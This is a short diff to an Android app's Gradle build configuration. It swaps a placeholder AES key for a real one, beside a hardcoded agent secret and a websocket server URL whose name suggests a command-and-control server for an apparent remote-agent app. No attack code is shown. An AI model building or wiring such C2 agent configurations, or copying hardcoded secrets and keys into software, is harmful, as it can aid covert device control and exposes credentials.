@@ -15,7 +15,7 @@ android {
         versionName = "2.0"
         buildConfigField("String", "SERVER_URL", "\"wss://queen-hadil-c2.onrender.com\"")
         buildConfigField("String", "AGENT_SECRET", "\"MySecret2024abc123XYZ\"")
-        buildConfigField("String", "AES_KEY", "\"PLACEHOLDER_KEY\"")
+        buildConfigField("String", "AES_KEY", "\"/q0H+1iaq2aFoyk9rXhoOEn0tGk51KIn9OznI459bTg=\"")
     }
 
     buildTypes {
